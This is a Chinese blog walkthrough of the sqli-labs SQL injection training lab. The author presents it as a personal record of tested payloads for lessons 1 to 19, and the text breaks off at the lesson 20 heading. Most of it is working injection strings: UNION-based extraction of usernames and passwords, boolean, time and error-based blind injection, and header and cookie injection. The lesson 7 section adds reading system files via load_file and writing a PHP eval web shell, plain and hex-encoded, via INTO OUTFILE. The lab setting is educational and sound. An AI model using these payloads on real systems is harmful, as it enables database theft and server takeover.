<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Sqli Labs | cheng_xing's blog</title><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="学了一年多Web竟然还没有通关sqli-labs，真是杂鱼呢，今天来把这个坑填了。网上通关教程很多，为了方便本人后续使用，这篇博客的主要作用就是记录一些经过测试好使的payload。 Basic challengesLess-1基本注入语句 123456789正常 ?id&#x3D;1报错 ?id&#x3D;1&#x27;正常 ?id&#x3D;1&#x27;or 1&#x3D;1--+正常 ?id&#x3D;1&#x27;order by 3-">
<meta property="og:type" content="article">
<meta property="og:title" content="Sqli Labs">
<meta property="og:url" content="http://example.com/2025/04/03/sqli-labs/index.html">
<meta property="og:site_name" content="cheng_xing&#39;s blog">
<meta property="og:description" content="学了一年多Web竟然还没有通关sqli-labs，真是杂鱼呢，今天来把这个坑填了。网上通关教程很多，为了方便本人后续使用，这篇博客的主要作用就是记录一些经过测试好使的payload。 Basic challengesLess-1基本注入语句 123456789正常 ?id&#x3D;1报错 ?id&#x3D;1&#x27;正常 ?id&#x3D;1&#x27;or 1&#x3D;1--+正常 ?id&#x3D;1&#x27;order by 3-">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/ltx.jpg">
<meta property="article:published_time" content="2025-04-03T06:23:17.617Z">
<meta property="article:modified_time" content="2025-04-05T17:17:22.744Z">
<meta property="article:author" content="cheng_xing">
<meta property="article:tag" content="sql注入">
<meta property="article:tag" content="mysql">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/ltx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Sqli Labs",
  "url": "http://example.com/2025/04/03/sqli-labs/",
  "image": "http://example.com/img/ltx.jpg",
  "datePublished": "2025-04-03T06:23:17.617Z",
  "dateModified": "2025-04-05T17:17:22.744Z",
  "author": [
    {
      "@type": "Person",
      "name": "cheng_xing",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/ltx.jpg"><link rel="canonical" href="http://example.com/2025/04/03/sqli-labs/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Sqli Labs',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Sqli Labs</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Sqli Labs</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-03T06:23:17.617Z" title="发表于 2025-04-03 14:23:17">2025-04-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-05T17:17:22.744Z" title="更新于 2025-04-06 01:17:22">2025-04-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%9F%BA%E7%A1%80/">web基础</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>学了一年多Web竟然还没有通关sqli-labs，真是杂鱼呢，今天来把这个坑填了。网上通关教程很多，为了方便本人后续使用，这篇博客的主要作用就是记录一些经过测试好使的payload。</p>
<h2 id="Basic-challenges"><a href="#Basic-challenges" class="headerlink" title="Basic challenges"></a>Basic challenges</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>基本注入语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">正常 ?id=1</span><br><span class="line">报错 ?id=1&#x27;</span><br><span class="line">正常 ?id=1&#x27;or 1=1--+</span><br><span class="line">正常 ?id=1&#x27;order by 3--+</span><br><span class="line">报错 ?id=1&#x27;order by 4--+</span><br><span class="line">数据库 ?id=-1&#x27;union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br><span class="line">表名 ?id=-1&#x27;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">列名 ?id=-1&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">数据 ?id=-1&#x27;union select 1,username,password from users where id=2--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or 1=1--+</span><br><span class="line">后续Payload参考Less-1</span><br></pre></td></tr></table></figure>
<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) or &#x27;1&#x27;=(&#x27;1</span><br><span class="line">?id=1&#x27;) or 1=1--+</span><br><span class="line">后续Payload参考Less-1</span><br></pre></td></tr></table></figure>

<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) or &quot;1&quot;=(&quot;1</span><br><span class="line">?id=1&quot;) or 1=1--+</span><br><span class="line">后续Payload参考Less-1</span><br></pre></td></tr></table></figure>

<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>布尔盲注，报错注入，时间盲注</p>
<p>(1)利用 left(database(),1)进行尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and left(version(),1)=5%23</span><br><span class="line"></span><br><span class="line">left(a,b)  从左侧截取a的前b位</span><br></pre></td></tr></table></figure>
<p>查看一下version()，数据库的版本号为5.6.17，这里的语句的意思是看版本号的第一位是不是5</p>
<p>接下来看一下数据库的长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and length(database())=8%23</span><br></pre></td></tr></table></figure>
<p>长度为8时，返回正确结果，说明长度为8</p>
<p>猜测数据库第一位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and left(database(),1)&gt;&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
<p>Database()为security，所以我们看他的第一位是否&gt;a,很明显的是s&gt;a,因此返回正确。当我们不知情的情况下，可以用二分法来提高注入的效率</p>
<p>猜测数据库第二位<br>得知第一位为s，我们看前两位是否大于sa</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and left(database(),2)&gt;&#x27;sa&#x27;--+</span><br></pre></td></tr></table></figure>

<p>(2)利用 substr() ascii()函数进行尝试</p>
<p>获取security数据库的第一个表的第一个字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80--+</span><br><span class="line"></span><br><span class="line">substr(a,b,c)从b位置开始，截取字符串a的c长度。ascii()将某个字符转换为ascii值</span><br></pre></td></tr></table></figure>
<p>此处table_schema可以写成’security’，这里使用的database()，是因为此处database()就是security。此处同样的使用二分法进行测试，直到测试正确为止。<br>此处应该是101，因为第一个表是email</p>
<p>获取第一个表的第二位字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;80--+</span><br></pre></td></tr></table></figure>

<p>那如何获取第二个表呢？<br>可以看到上述语句中使用的limit 0,1意思就是从第0个开始，获取第一个。那获取第二个就是 limit 1,1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;113--+</span><br></pre></td></tr></table></figure>

<p>(3)利用 regexp 获取users表中的列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and table_name regexp &#x27;^us[a-z]&#x27; limit 0,1)--+</span><br></pre></td></tr></table></figure>
<p>上述语句判断users表中是否有名为us**的列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and column_name regexp &#x27;^username&#x27; limit 0,1)--+</span><br></pre></td></tr></table></figure>
<p>上述语句判断users表中是否有名为username的列</p>
<p>table_name 有好几个，我们只得到了一个 user，如何知道其他的？<br>这里可能会有人认为使用 limit 0,1 改为 limit 1,1。<br>但是这种做法是错误的，limit 作用在前面的 select 语句中，而不是 regexp。其实在 regexp 中我们是取匹配 table_name 中的内容，只要 table_name 中有的内容，我们用 regexp 都能够匹配到。因此上述语句不仅仅可以选择 user，还可以匹配其他项。</p>
<p>还可以使用like进行模糊匹配</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user() like &#x27;ro%&#x27;</span><br></pre></td></tr></table></figure>

<p>(4)利用 ord()和 mid()函数获取 users 表的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68--+</span><br><span class="line"></span><br><span class="line">mid(a,b,c)从位置b开始，截取a字符串的c位</span><br><span class="line">ord()函数同ascii()，将字符转为ascii值</span><br></pre></td></tr></table></figure>
<p>获取 username 中的第一行的第一个字符的ascii，与68进行比较，即为 D</p>
<p>(5)报错注入</p>
<p>floor报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br></pre></td></tr></table></figure>

<p>利用 double 数值类型超出范围进行报错注入（未成功）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select (exp(~(select * from(select user())a))),2,3--+</span><br></pre></td></tr></table></figure>

<p>利用 bigint 溢出进行报错注入（未成功）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select (!(select * from (select user())x) - ~0),2,3--+</span><br></pre></td></tr></table></figure>

<p>xpath 函数报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) --+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --+</span><br></pre></td></tr></table></figure>

<p>利用数据的重复性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;union select 1,2,3 from (select name_const(version(),1), name_const(version(),1))x --+</span><br></pre></td></tr></table></figure>

<p>(6)时间盲注</p>
<p>利用 sleep()函数进行注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
<p>当错误的时候会有 5 秒的时间延时。</p>
<p>利用 benchmark()进行延时注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;union select (if(substring(current,1,1)=char(115),benchmark(50000000,encode(&#x27;MSG&#x27;,&#x27;by 5 seconds&#x27;)),null)),2,3 from (select database() as current) as tb1--+</span><br></pre></td></tr></table></figure>
<p>当结果正确的时候，运行 ENCODE(‘MSG’,’by 5 seconds’)操作 50000000 次，会占用一段时间。</p>
<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>双引号型注入，Payload参考Less-5</p>
<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>先看看导入导出相关操作<br>(1)load_file导出文件<br>使用条件：必须有权限读取并且文件必须完全可读</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0</span><br></pre></td></tr></table></figure>
<p>如果结果返回正常,说明具有读写权限。</p>
<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))</span><br><span class="line">利用 hex()将文件内容导出来，尤其是smb文件时可以使用。</span><br><span class="line"></span><br><span class="line">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br><span class="line">Explain：&quot;char(99,58,47,98,111,111,116,46,105,110,105)&quot;就是&quot;c:/boot.ini&quot;的 ASCII 代码</span><br><span class="line"></span><br><span class="line">-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</span><br><span class="line">Explain：&quot;c:/boot.ini&quot;的 16 进制是&quot;0x633a2f626f6f742e696e69&quot;</span><br><span class="line"></span><br><span class="line">-1 union select 1,1,1,load_file(c:\\boot.ini)</span><br><span class="line">Explain: 路径里的/用 \\代替</span><br></pre></td></tr></table></figure>

<p>(2)导入到文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ..... into outfile &#x27;file_name&#x27;</span><br></pre></td></tr></table></figure>
<p>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此必须拥有FILE权限，才能使用此语法,且file_name不能是一个已经存在的文件。</p>
<p>一般有两种利用形式：</p>
<p>第一种直接将 select 内容导入到文件中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &lt;?php @eval($_post[&quot;cmd&quot;])?&gt; into outfile &quot;c:\\phpnow\\htdocs\\test.php&quot; </span><br></pre></td></tr></table></figure>

<p>第二种修改文件结尾：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select version() into outfile &quot;c:\\phpnow\\htdocs\\test.php&quot; lines terminated by 0x16</span><br></pre></td></tr></table></figure>

<p>上述提到了 load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini&#x27;) into outfile &#x27;c:\\wamp\\www\\test.php&#x27;</span><br></pre></td></tr></table></figure>
<p>可以利用该语句将服务器当中的内容导入到 web 服务器下的目录，这样就可以得到数据了。</p>
<p>下面来看Less-7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) or 1=1--+</span><br><span class="line">?id=1&#x27;)) into outfile &quot;/tmp/1.php&quot; lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373375d293b3f3e--+</span><br><span class="line">?id=1&#x27;)) union select null,0x3c3f706870206576616c28245f504f53545b2774657374275d293f3e,null into outfile &quot;/tmp/1.php&quot;--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;or 1=1--+</span><br><span class="line">?id=1&#x27;and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</span><br><span class="line">?id=1&#x27;and If(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))=101,1,sleep(5))--+</span><br><span class="line">?id=1&#x27;and If(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=105,1,sleep(5))--+</span><br><span class="line">?id=1&#x27;and If(ascii(substr((select username from users limit 0,1), 1,1))=68,1,sleep(5))--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>同Less-8</p>
<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=&quot;or 1=1--+</span><br><span class="line">Payload参考Less-8</span><br></pre></td></tr></table></figure>

<h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>post注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#x27;or&#x27;1&#x27;=&#x27;1#</span><br><span class="line">password: 111</span><br></pre></td></tr></table></figure>

<h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&quot;)#</span><br><span class="line">password: 111</span><br></pre></td></tr></table></figure>
<p>这里注意用 admin”)or 1&#x3D;1#方式登录的话，最后是以 Dumb 登录，这是因为 sql 执行的优先级的问题。</p>
<h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;)and left(database(),1)&gt;&#x27;a&#x27;#&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;and left(database(),1)&gt;&#x27;a&#x27;#&amp;passwd=1&amp;submit=Submit</span><br><span class="line">uname=admin&quot;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;passwd=11&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;)and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;passwd=11&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>首先看看增删改语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">insert into users values(&#x27;16&#x27;,&#x27;lcamry&#x27;,&#x27;lcamry&#x27;);</span><br><span class="line">delete from users where id=16;</span><br><span class="line">drop database 数据库名;</span><br><span class="line">drop table 表名;</span><br><span class="line">alter table 表名 drop column 列名;</span><br><span class="line">update users set username=&#x27;tt&#x27; where id=15;</span><br></pre></td></tr></table></figure>

<p>继续看Less-17</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=11&#x27;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;submit=Submit</span><br><span class="line">uname=admin&amp;passwd=11&#x27;and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>user-agent注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 user-agent 修改为&#x27;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>referer注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 referer 修改为&#x27;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>cookie注入</p>
